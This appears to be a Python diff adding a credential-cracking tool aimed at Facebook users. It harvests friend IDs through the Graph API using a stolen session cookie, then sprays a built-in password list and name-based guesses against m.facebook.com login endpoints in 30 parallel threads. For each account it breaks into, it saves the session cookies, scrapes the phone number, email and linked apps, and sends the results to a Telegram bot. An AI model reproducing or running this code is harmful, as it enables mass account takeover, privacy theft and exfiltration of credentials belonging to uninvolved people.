+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+pwpluss,pwnya=[],[]
+
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+#asu = random.choice([m,k,h,u,b])
+AB_A='\x1b[1;97m' # ابيض خط عربض
+RS='\x1b[30m' #رصاصي
+AH_F='\x1b[31m'   #احمر فاتح
+AKH_F='\x1b[32m' #اخضر فاتح
+AS_T='\x1b[33m'#اصفر طوخ
+SM='\x1b[34m'  #سمائي
+BN='\x1b[35m'#بنفسجي
+AZ_T='\x1b[36m'  #ازرك طوخ
+AB_KH='\x1b[37m' #ابيض خط خفيف
+AH_T='\x1b[91m'  #احمر طوخ
+AKH_T='\x1b[92m'#اخضر طوخ
+AS_F='\x1b[93m'    #اصفر فاتح
+WR='\x1b[95m'      #وردي
+p='\x1b[38;5;208m' #برتقالي
+AH2='\x1b[38;5;204m' 
+AS2='\x1b[38;5;220m'
+MJ='\x1b[38;5;193m'
+MJ2='\x1b[38;5;216m'
+MJ3='\x1b[38;5;190m'
+O='\x1b[0;96m'     # Biru Muda
+P='\x1b[38;5;231m' # Putih
+J='\x1b[38;5;208m' # Jingga
+MJ4='\x1b[38;5;106m'
+asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])
+
+print(f"""\033[1;49m
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬
+ | نمـرود لديكم لا خوف عليكم |
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬⠀⠀⠀
+⠀⠀⠀⠀⠀⠀
+———————————————
+المبـرمج نمـرود | @M_T_F ✅
+———————————————
+
+""")
+sleep(4)
+os.system('clear')
+
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+
+def fak_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
+def clear():
+	os.system('clear')
+def back():
+	login()
+
+def banner():
+	print(f'''\t{asu}''')
+
+def login():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
+			main()
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
+			lo = mark(li, style='red')
+			sol().print(lo, style='cyan')
+			exit()
+	except IOError:
+		login_lagi334()
+def login_lagi334():
+	try:
+		os.system('clear')
+		banner()
+		cok = input(' ڪوڪيز cookies  = ')
+		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
+		dat  = {}
+		raq  = pos.find('form',{'method':'post'})
+		for x in raq('input',{'value':True}):
+			try:
+				if x['name'] == '__CANCEL__':
+					pass
+				else:
+					dat.update({x['name']:x['value']})
+			except Exception as e:
+				pass
+		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[VIP]  tekan enter'); os.system('clear'); login()
+	except Exception as e:
+		print(e)
+#------------------[ سلفادور]----------------#
+def main():
+	os.system('clear')
+	banner()
+	ip = requests.get("https://api.ipify.org").text
+	gh = 'h'
+	print('') 
+	print(f""" \033[1;34m
+\x1b[38;5;180m \x1b[38;5;180m 
+░██████╗██████╗░███╗░░░███╗
+██╔════╝██╔══██╗████╗░████║
+╚█████╗░██║░░██║██╔████╔██║
+░╚═══██╗██║░░██║██║╚██╔╝██║
+██████╔╝██████╔╝██║░╚═╝░██║
+╚═════╝░╚═════╝░╚═╝░░░░░╚═╝
+———————————————
+نـمـرود 𝑆 𝐷 𝑀  VIP | @M_T_F
+———————————————
+
+""")
+
+    #print(f'{K}┏▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱┓')
+	print(a16+'▭▬'*30)
+	print(a12+"▬" *60)
+	print(f'{a37}[1]  𝒇𝒊𝒍𝒆  •|• صيـد من ملف') 
+	print(a18+"●" *60)
+	print(f'{a37}[0] 𝐄𝐗𝐈𝐓 •|• خـروج ] ')
+	print(a12+"▬" *60)
+	print(a16+'▭▬'*30)
+	_____alvino__adijaya_____ = input(f'{u} [VIP]  آخـتاࢪ : ')
+	if _____alvino__adijaya_____ in ['2222']:
+		dump_massal()
+	elif _____alvino__adijaya_____ in ['2878']:
+		dump_follower()
+	elif _____alvino__adijaya_____ in ['3549']:
+		grup()
+	elif _____alvino__adijaya_____ in ['1']:
+		crack_file()
+	elif _____alvino__adijaya_____ in ['1385']:
+		result()
+	elif _____alvino__adijaya_____ in ['0']:
+		os.system('rm -rf .token.txt')
+		os.system('rm -rf .cookie.txt')
+		print(' [✓] - Done Logout + Hapus Kukis ')
+		exit()
+	else:
+		print('>> PILIH YANG BENAR ')
+		back()
+def error():
+	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	time.sleep(4)
+	back()
+
+def crack_file():
+            try:
+                print('')
+                fileX = input (f'{P}Name File {M}:{H} ')
+                for line in open(fileX, 'r').readlines():
+                    id.append(line.strip())
+                setting()
+            except IOError:
+               exit(f"\n{M}File %s not found"%(fileX))
+#-------------[ PENGATURAN-IDZ ]---------------#
+def setting():
+	print(f'{N}  ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
+	print(f'{N}├───[{H}2{N}] New {H}[صيــد متوسيط]{N}')
+	print(f'{N}├───[{H}3{N}] Random {H}[صيـد قوي]{N}')
+	print(f'{N}├──╭[{h}CHOICE METODE{N}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬') 
+	hu = input(f'│  ╰─➣{h} ')
+	if hu in ['2222','02221']:
+		for tua in sorted(id):
+			id2.append(tua)
+
+	elif hu in ['1','01']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		print(f'{N}├───[{H}+{N}] آخـتاࢪ نوع جهازك ')
+		exit()
+	print(f'{N}├───────────────────────────────────────────────────────')
+	print(f'{N}├───[{N}1{O}] اندرويد {H}[RECOMMENDED]{N}')
+	print(f'{N}├───[{N}2{O}] PC ')
+	print(f'├──╭[{h}CHOICE METODE{N}]────────────────────────────────────────────')
+	hc = input(f'│  ╰─➣{h} ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['2','02']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	print(f'{N}│')
+	passwrd()
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump_massal():
+	#with requests.Session() as ses:
+			
+			yu = f'{b} Total ID :  \033[2;32m '+str(len(id))
+			print(yu)
+			setting()
+	#	except Exception as e:
+			print(e)
+
+# DUMP ID MASSAL
+def dump_massal():
+	#with requests.Session() as ses:
+	#	token = open('.token.txt','r').read()
+	#	cok = open('.cok.txt','r').read()
+	#except IOError:
+	    #exit()
+	try:
+		print(f'{K}┏⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯┓')
+		kumpulkan = int(input(f'    ﴾z﴿ ضع عدد الايديات تريد تصيد عليهم   IDS :- '))
+		print('{K}┗⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯┛') 
+		
+	except ValueError:
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
+	ses=requests.Session()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f' {O} ايدي لـ   Id '+str(bilangan)+f' : ')
+		#print(f'')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      op = f" [{H}-{N}] {K}Total {H} : "+str(len(id))
+	      print('')
+	      print(op)
+	      setting() 
+	except Exception as e:
+	    print(e) 
+	    exit()
+
+def setting():
+	wl = f''
+		    #print(f'{K}┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┓')
+	sol().print(mark(wl, style='yellow'))
+	teks = (f'{H} نورت يتم تشغيل الصيد تلقائي انتظر...') 
+	print('') 
+	print(teks)
+	hu =('3') 
+		  
+		              #print(f'{N}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		ric = ''
+		sol().print(mark(ric, style='green'))
+		exit()
+#    print('>> 2. Mbasic ')
+#    print('>> 3. Touch  ')
+#    print('>> 4. Mtouch ')
+	#print('')
+	hc =('1') 
+	print('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬') 
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['']:
+		print('[VIP]  PILIH YANG BENAR BANG ')
+		setting()
+#	elif hc in ['2','02']:
+#		method.append('free')
+#	elif hc in ['3','03']:
+#		method.append('touch')
+	elif hc in ['4','04']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	print('')
+	_jembot_ =('Y') 
+	if _jembot_ in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		back()
+	elif _jembot_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
+	pwplus= 't'
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
+	passwrd()
+
+def passwrd():
+   
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(nmf)
+					pwv.append('qqwweerr')
+					pwv.append('aaaassss')
+					pwv.append('zzzzxxxx')
+					pwv.append('07700770')
+					pwv.append('07800780')
+					pwv.append('Mohamed2005')
+					pwv.append('11223344556677')
+					pwv.append('nnnnmmmm')
+					pwv.append('mmmmnnnn')
+					pwv.append('00998877')
+					pwv.append('12345qwert')
+					pwv.append('qqwweerrtt')
+					pwv.append('zzxxccvv')
+					pwv.append('zxcvzxcv')
+					pwv.append('19901990')
+					pwv.append('19911991')
+					pwv.append('19921992')
+					pwv.append('19931993')
+					pwv.append('19941994')
+					pwv.append('19951995')
+					pwv.append('19961996')
+					pwv.append('19971997')
+					pwv.append('19981998')
+					pwv.append('19991999')
+					pwv.append('20012001')
+					pwv.append('20052005')
+					pwv.append('20062006')
+					pwv.append('20072007')
+					pwv.append('1122334455@@')
+					pwv.append('1q2w3e4r5t6y')
+					pwv.append('1q2w3e4r5t')
+					pwv.append('1122334455')
+					pwv.append('112233445566')
+					pwv.append('ppooiiuu')
+					pwv.append('qqwweerr')
+					pwv.append('qqwweerr@@')
+					pwv.append('ppooiiuu@@')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append('qqwweerr')
+					pwv.append('aaaassss')
+					pwv.append('zzzzxxxx')
+					pwv.append('07700770')
+					pwv.append('07800780')
+					pwv.append('Mohamed2005')
+					pwv.append('11223344556677')
+					pwv.append('nnnnmmmm')
+					pwv.append('mmmmnnnn')
+					pwv.append('00998877')
+					pwv.append('12345qwert')
+					pwv.append('qqwweerrtt')
+					pwv.append('zzxxccvv')
+					pwv.append('zxcvzxcv')
+					pwv.append('19901990')
+					pwv.append('19911991')
+					pwv.append('19921992')
+					pwv.append('19931993')
+					pwv.append('19941994')
+					pwv.append('19951995')
+					pwv.append('19961996')
+					pwv.append('19971997')
+					pwv.append('19981998')
+					pwv.append('19991999')
+					pwv.append('20012001')
+					pwv.append('20052005')
+					pwv.append('20062006')
+					pwv.append('20072007')
+					pwv.append('1122334455@@')
+					pwv.append('1q2w3e4r5t6y')
+					pwv.append('1q2w3e4r5t')
+					pwv.append('1122334455')
+					pwv.append('112233445566')
+					pwv.append('ppooiiuu')
+					pwv.append('qqwweerr')
+					pwv.append('qqwweerr@@')
+					pwv.append('ppooiiuu@@')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'api' in method:
+				pool.submit(crack2,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crack3,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
+	print('')
+	os.system('clear')
+	cetak(nel('\t[cyan]✓[green] The hunt is complete, thank you[cyan] ✓[white] '))
+	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x}  '%(cp))
+	print('')
+	print('>> Lanjut Crack Kembali ( Y/t ) ?')
+	woi = input(f'>> Pilih : ')
+	if woi in ['y','Y']:
+		back()
+	else:
+		print(f'\t{x}<>{k} Good Bye {x} <> ')
+		time.sleep(2)
+		back() 
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	rc = random.choice
+	amr = rc(['😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])
+	sys.stdout.write(f"\r{bo}({amr}𖤤𝑆𝐷𝑀 نمࢪود³¹³𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			tix = time.time()
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				if 'ya' in oprek:
+					akun.append(idf+'|'+pw)
+					ceker(idf,pw)
+				else:
+					print('\n')
+					statuscp = f'''
+					▄︻デ══━一 «𝗖𝗣❌  سڪيوࢪ ࿐» ⏎
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+ (♕) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
+ 
+
+(♕) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{pw}
+ 
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+(♕) 𝑆𝐷𝑀 𝑆𝐷𝑀 نمࢪود𖣬 :『@M_T_F 』⏎
+					'''
+					statuscp1 = nel(statuscp, style='red')
+					cetak(nel(statuscp1, title='SESI'))
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					cp+=1
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					print('\n')
+					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
+\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
+ 
+\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}
+
+\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
+\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+\n(♕) 𝑆𝐷𝑀 𝑆𝐷𝑀 نمࢪود𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
+					'''
+					statusok1 = nel(statusok, style='green')
+					cetak(nel(statusok1, title='OK'))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_SDMVIP(kuki)
+					break
+				elif 'ya' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					user=idf
+					infoakun = ""
+					session = requests.Session()
+					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
+					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
+					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
+					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
+					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
+					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
+					except:nomer = ""
+					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
+					except:email=""
+					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
+					except:ttl=""
+					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+					except:teman = ""
+					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
+					except:pengikut = ""
+					try:
+						tahun = ""
+						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
+						for nenen in cek_thn:
+							tahun += nenen+", "
+					except:pass
+
+					infoakun += f'''\n▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
+\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
+ 
+\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}
+
+\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
+\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+\n(♕) 𝑆𝐷𝑀 𝑆𝐷𝑀 نمࢪود𖣬 \n:『@M_T_F 』⏎'''
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
+
+					hit1, hit2 = 0,0
+					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+						infoakun += (f"Aplikasi Yang Terkait*\n")
+						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
+						else:
+							infoakun += (f"	Aplikasi Aktif : \n")
+							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
+							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
+							for muncul in apkAktif:
+								hit1+=1
+								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
+								hit2+=1
+						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
+							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
+						else:
+							hit1,hit2=0,0
+							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
+							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
+							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
+							for muncul in apkKadaluarsa:
+								hit1+=1
+								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
+								hit2+=1
+					else:pass
+					print('\n')
+					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال ࿐» ⏎
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+ (𝑆𝐷𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
+ 
+(𝑆𝐷𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 ッ  :{pw}
+
+(𝑆𝐷𝑀) જ⁀➴  - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ :{kuki}
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+(♕) 𝑆𝐷𝑀 𝑆𝐷𝑀 نمࢪود𖣬 :『@M_T_F 』⏎'''
+					statusok1 = nel(statusok, style='green')
+					cetak(nel(statusok1, title='OK'))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_SDMVIP(kuki)
+					break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+def cek_SDMVIP(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
